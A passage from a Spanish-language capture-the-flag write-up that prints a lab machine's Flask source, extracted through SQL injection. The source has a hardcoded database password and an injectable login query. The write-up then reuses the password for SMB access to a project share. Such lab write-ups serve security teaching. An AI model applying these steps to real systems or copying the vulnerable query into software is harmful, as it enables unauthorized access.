<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">random</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">os</span>

<span class="mtk3"># Define logging</span>
<span class="mtk8 mtku">logging</span><span class="mtk1">.</span><span class="mtk8">basicConfig</span><span class="mtk1">(</span><span class="mtk9 mtki">stream</span><span class="mtk5">=</span><span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">stderr</span><span class="mtk1">)</span>
<span class="mtk8 mtku">sys</span><span class="mtk1">.</span><span class="mtk1">path</span><span class="mtk1">.</span><span class="mtk8">insert</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">,</span><span class="mtk4">"/var/www/writer.htb/"</span><span class="mtk1">)</span>

<span class="mtk3"># Import the __init__.py from the app folder</span>
<span class="mtk5">from</span><span class="mtk1"> writer </span><span class="mtk5">import</span><span class="mtk1"> app </span><span class="mtk5">as</span><span class="mtk1"> application</span>
<span class="mtk1">application.secret_key </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk1">environ</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">"SECRET_KEY"</span><span class="mtk1">, </span><span class="mtk4">""</span><span class="mtk1">)</span>  
</code></pre></div><p>Este <em>script</em> de Python está importando otro desde <code>writer</code>. Python utiliza nombres de archivos especiales a la hora de importar módulos. Básicamente, el <em>script</em> que está importando es <code>/var/www/writer.htb/writer/__init__.py</code>. Se trata de un archivo extremadamente largo que contiene toda la funcionalidad del <em>back-end</em> (será necesario esperar más de 20 minutos para extraer el archivo completo). A continuación se muestra el código en cuestión, con algunos métodos recortados:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">sqli.py</span> /var/www/writer.htb/writer/__init__.py  
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">flask</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">Flask</span><span class="mtk1">, </span><span class="mtk1">session</span><span class="mtk1">, </span><span class="mtk8">redirect</span><span class="mtk1">, </span><span class="mtk8">url_for</span><span class="mtk1">, </span><span class="mtk1">request</span><span class="mtk1">, </span><span class="mtk8">render_template</span>
<span class="mtk5">from</span><span class="mtk1"> mysql.connector </span><span class="mtk5">import</span><span class="mtk1"> errorcode</span>
<span class="mtk5">import</span><span class="mtk1"> mysql.connector</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">urllib</span><span class="mtk1">.</span><span class="mtk8 mtku">request</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">os</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">PIL</span>
<span class="mtk5">from</span><span class="mtk1"> </span><span class="mtk8 mtku">PIL</span><span class="mtk1"> </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">Image</span><span class="mtk1">, </span><span class="mtk8 mtku">UnidentifiedImageError</span>
<span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">hashlib</span>

<span class="mtk1">app</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">Flask</span><span class="mtk1">(</span><span class="mtk1">__name__</span><span class="mtk1">,</span><span class="mtk9 mtki">static_url_path</span><span class="mtk5">=</span><span class="mtk4">''</span><span class="mtk1">,</span><span class="mtk9 mtki">static_folder</span><span class="mtk5">=</span><span class="mtk4">'static'</span><span class="mtk1">,</span><span class="mtk9 mtki">template_folder</span><span class="mtk5">=</span><span class="mtk4">'templates'</span><span class="mtk1">)</span>

<span class="mtk3">#Define connection for database</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">connections</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">connector</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk1">.connector.connect(</span><span class="mtk9 mtki">user</span><span class="mtk5">=</span><span class="mtk4">'admin'</span><span class="mtk1">, </span><span class="mtk9 mtki">password</span><span class="mtk5">=</span><span class="mtk4">'ToughPasswordToCrack'</span><span class="mtk1">, </span><span class="mtk9 mtki">host</span><span class="mtk5">=</span><span class="mtk4">'127.0.0.1'</span><span class="mtk1">, </span><span class="mtk9 mtki">database</span><span class="mtk5">=</span><span class="mtk4">'writer'</span><span class="mtk1">)</span>  
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">connector</span>
<span class="mtk1">    </span><span class="mtk5">except</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk1">.connector.Error </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">err</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">err</span><span class="mtk1">.errno </span><span class="mtk5">==</span><span class="mtk1"> errorcode.</span><span class="mtk6">ER_ACCESS_DENIED_ERROR</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk4">"Something is wrong with your db user name or pass</span><span class="mtk4">word!"</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">elif</span><span class="mtk1"> </span><span class="mtk1">err</span><span class="mtk1">.errno </span><span class="mtk5">==</span><span class="mtk1"> errorcode.</span><span class="mtk6">ER_BAD_DB_ERROR</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk4">"Database does not exist"</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk4">"Another exception, returning!"</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk7">print</span><span class="mtk1"> (</span><span class="mtk4">'Connection to DB is ready!'</span><span class="mtk1">)</span>

<span class="mtk3">#Define homepage</span>
<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">)</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">home_page</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">connector</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">connections</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk5">except</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk1">.connector.Error </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">err</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk4">"Database error"</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">cursor</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">connector</span><span class="mtk1">.cursor()</span>
<span class="mtk1">    </span><span class="mtk1">sql_command</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"SELECT * FROM stories;"</span>
<span class="mtk1">    </span><span class="mtk1">cursor</span><span class="mtk1">.execute(</span><span class="mtk1">sql_command</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">results</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">cursor</span><span class="mtk1">.fetchall()</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'blog/blog.html'</span><span class="mtk1">, </span><span class="mtk9 mtki">results</span><span class="mtk5">=</span><span class="mtk1">results</span><span class="mtk1">)</span>

<span class="mtk3">#Define about page</span>
<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/about'</span><span class="mtk1">)</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">about</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'blog/about.html'</span><span class="mtk1">)</span>

<span class="mtk3">#Define contact page</span>
<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/contact'</span><span class="mtk1">)</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">contact</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'blog/contact.html'</span><span class="mtk1">)</span>

<span class="mtk3">#Define blog posts</span>
<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/blog/post/&lt;id&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">blog_post</span><span class="mtk1">(</span><span class="mtk9 mtki">id</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">connector</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">connections</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk5">except</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk1">.connector.Error </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">err</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk4">"Database error"</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">cursor</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">connector</span><span class="mtk1">.cursor()</span>
<span class="mtk1">    </span><span class="mtk1">cursor</span><span class="mtk1">.execute(</span><span class="mtk4">"SELECT * FROM stories WHERE id = </span><span class="mtk6">%(id)s</span><span class="mtk4">;"</span><span class="mtk1">, {</span><span class="mtk4">'id'</span><span class="mtk1">: </span><span class="mtk9 mtki">id</span><span class="mtk1">})</span>
<span class="mtk1">    </span><span class="mtk1">results</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">cursor</span><span class="mtk1">.fetchall()</span>
<span class="mtk1">    </span><span class="mtk1">sql_command</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"SELECT * FROM stories;"</span>
<span class="mtk1">    </span><span class="mtk1">cursor</span><span class="mtk1">.execute(</span><span class="mtk1">sql_command</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">stories</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">cursor</span><span class="mtk1">.fetchall()</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'blog/blog-single.html'</span><span class="mtk1">, </span><span class="mtk9 mtki">results</span><span class="mtk5">=</span><span class="mtk1">results</span><span class="mtk1">, </span><span class="mtk9 mtki">stories</span><span class="mtk5">=</span><span class="mtk1">stories</span><span class="mtk1">)</span>

<span class="mtk3">#Define dashboard for authenticated users</span>
<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/dashboard'</span><span class="mtk1">)</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">dashboard</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> (</span><span class="mtk4">'user'</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">session</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'dashboard.html'</span><span class="mtk1">)</span>

<span class="mtk3">#Define stories page for dashboard and edit/delete</span><span class="mtk3"> pages</span>
<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/dashboard/stories'</span><span class="mtk1">)</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">stories</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> (</span><span class="mtk4">'user'</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">session</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">connector</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">connections</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk5">except</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk1">.connector.Error </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">err</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk4">"Database error"</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">cursor</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">connector</span><span class="mtk1">.cursor()</span>
<span class="mtk1">    </span><span class="mtk1">sql_command</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Select * From stories;"</span>
<span class="mtk1">    </span><span class="mtk1">cursor</span><span class="mtk1">.execute(</span><span class="mtk1">sql_command</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">results</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">cursor</span><span class="mtk1">.fetchall()</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'stories.html'</span><span class="mtk1">, </span><span class="mtk9 mtki">results</span><span class="mtk5">=</span><span class="mtk1">results</span><span class="mtk1">)</span>

<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/dashboard/stories/add'</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">, </span><span class="mtk4">'POST'</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">add_story</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk3"># ...</span>

<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/dashboard/stories/edit/&lt;id&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">, </span><span class="mtk4">'POST'</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">edit_story</span><span class="mtk1">(</span><span class="mtk9 mtki">id</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk3"># ...</span>

<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/dashboard/stories/delete/&lt;id&gt;'</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">, </span><span class="mtk4">'POST'</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">delete_story</span><span class="mtk1">(</span><span class="mtk9 mtki">id</span><span class="mtk1">):</span>
<span class="mtk1">    </span><span class="mtk3"># ...</span>

<span class="mtk3">#Define user page for dashboard</span>
<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/dashboard/users'</span><span class="mtk1">)</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">users</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk3"># ...</span>

<span class="mtk3">#Define settings page</span>
<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/dashboard/settings'</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'GET'</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">settings</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk3"># ...</span>

<span class="mtk3">#Define authentication mechanism</span>
<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/administrative'</span><span class="mtk1">, </span><span class="mtk9 mtki">methods</span><span class="mtk5">=</span><span class="mtk1">[</span><span class="mtk4">'POST'</span><span class="mtk1">, </span><span class="mtk4">'GET'</span><span class="mtk1">])</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">login_page</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk4">'user'</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">session</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/dashboard'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">method</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">"POST"</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk1">username</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'uname'</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">form</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'password'</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">password</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">hashlib</span><span class="mtk1">.</span><span class="mtk8">md5</span><span class="mtk1">(</span><span class="mtk1">password</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">(</span><span class="mtk4">'utf-8'</span><span class="mtk1">)).</span><span class="mtk8">hexdigest</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">connector</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">connections</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk5">except</span><span class="mtk1"> </span><span class="mtk8 mtku">mysql</span><span class="mtk1">.connector.Error </span><span class="mtk5">as</span><span class="mtk1"> </span><span class="mtk1">err</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk4">"Database error"</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">try</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">cursor</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">connector</span><span class="mtk1">.cursor()</span>
<span class="mtk1">            </span><span class="mtk1">sql_command</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Select * From users Where username = '</span><span class="mtk6">%s</span><span class="mtk4">' And password = '</span><span class="mtk6">%s</span><span class="mtk4">'"</span><span class="mtk1"> </span><span class="mtk5">%</span><span class="mtk1"> (</span><span class="mtk1">username</span><span class="mtk1">, </span><span class="mtk1">password</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk1">cursor</span><span class="mtk1">.execute(</span><span class="mtk1">sql_command</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk1">results</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">cursor</span><span class="mtk1">.fetchall()</span>
<span class="mtk1">            </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">result</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">results</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk4">"Got result"</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">result</span><span class="mtk1"> </span><span class="mtk5">and</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">result</span><span class="mtk1">) </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">session</span><span class="mtk1">[</span><span class="mtk4">'user'</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">username</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'success.html'</span><span class="mtk1">, </span><span class="mtk9 mtki">results</span><span class="mtk5">=</span><span class="mtk1">results</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">                </span><span class="mtk1">error</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Incorrect credentials supplied"</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'login.html'</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk1">error</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">except</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">error</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Incorrect credentials supplied"</span>
<span class="mtk1">            </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'login.html'</span><span class="mtk1">, </span><span class="mtk9 mtki">error</span><span class="mtk5">=</span><span class="mtk1">error</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">else</span><span class="mtk1">:</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">render_template</span><span class="mtk1">(</span><span class="mtk4">'login.html'</span><span class="mtk1">)</span>

<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">"/logout"</span><span class="mtk1">)</span>
<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">logout</span><span class="mtk1">():</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk5">not</span><span class="mtk1"> (</span><span class="mtk4">'user'</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">session</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">session</span><span class="mtk1">.</span><span class="mtk8">pop</span><span class="mtk1">(</span><span class="mtk4">'user'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'/'</span><span class="mtk1">)</span>

<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">   </span><span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk4">"0.0.0.0"</span><span class="mtk1">)</span>
</code></pre></div><p>Este gran <em>script</em> contiene la siguiente contraseña: <code>ToughPasswordToCrack</code>.</p><h3 id="enumeración-por-smb">Enumeración por SMB</h3><p>A primera vista, tenemos la contraseña para conectarnos a MySQL (<code>ToughPasswordToCrack</code>) como usuario <code>writer</code>. Sin embargo, esta contraseña se reutiliza en SMB para el usuario <code>kyle</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">smbmap</span> -H 10.10.11.101 -u kyle -p ToughPasswordToCrack --no-banner

[+] IP: 10.10.11.101:445        Name: 10.10.11.101              Status: <span class="code-dark-green">Authenticated</span>
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  <span class="code-dark-yellow">READ ONLY</span>       Printer Drivers
        writer2_project                                         <span class="code-dark-green">READ, WRITE</span>
        IPC$                                                    <span class="code-dark-red">NO ACCESS</span>       IPC Service (writer server (Samba, Ubuntu))  
</code></pre></div><p>Como <code>kyle</code>, podemos leer y escribir archivos en <code>writer2_project</code>. Descarguemos todos los ficheros:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">smbclient</span> -U kyle //10.10.11.101/writer2_project
Enter WORKGROUP\kyle's password:
Try "help" to get a list of possible commands.
smb: \&gt; dir
  .                                   D        0  Mon Aug  2 19:46:12 2021  
  ..                                  D        0  Tue Jun 22 13:55:06 2021
  static                              D        0  Sun May 16 16:29:16 2021
  staticfiles                         D        0  Fri Jul  9 06:59:42 2021
  writer_web                          D        0  Wed May 19 11:26:18 2021
  requirements.txt                    N       15  Mon Aug  2 19:46:01 2021
  writerv2                            D        0  Wed May 19 08:32:41 2021
  manage.py                           N      806  Mon Aug  2 19:46:01 2021

                7151096 blocks of size 1024. 1985880 blocks available
smb: \&gt; recurse ON
smb: \&gt; prompt OFF
smb: \&gt; mget *
...
</code></pre></div><p>Una vez descargados, vemos que se trata de un proyecto de Django (otro <em>framework</em> web hecho en Python). Parece que el proyecto está sin terminar, pero es suficiente para encontrar otras credenciales de MySQL.</p><p>La contraseña se obtiene en el archivo <code>writer2_project/writer2/settings.py</code>, como se muestra en el siguiente fragmento de código:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3"># Database</span>
<span class="mtk3"># </span><span class="mtk3 detected-link">https://docs.djangoproject.com/en/1.10/ref/setting</span><span class="mtk3 detected-link">s/#databases</span>  

<span class="mtk1">DATABASES</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">    </span><span class="mtk4">'default'</span><span class="mtk1">: {</span>
<span class="mtk1">        </span><span class="mtk4">'ENGINE'</span><span class="mtk1">: </span><span class="mtk4">'django.db.backends.mysql'</span><span class="mtk1">,</span>
<span class="mtk1">        </span><span class="mtk4">'OPTIONS'</span><span class="mtk1">: {</span>
<span class="mtk1">            </span><span class="mtk4">'read_default_file'</span><span class="mtk1">: </span><span class="mtk4">'/etc/mysql/my.cnf'</span>
<span class="mtk1">        }</span>
<span class="mtk1">    }</span>
<span class="mtk1">}</span>
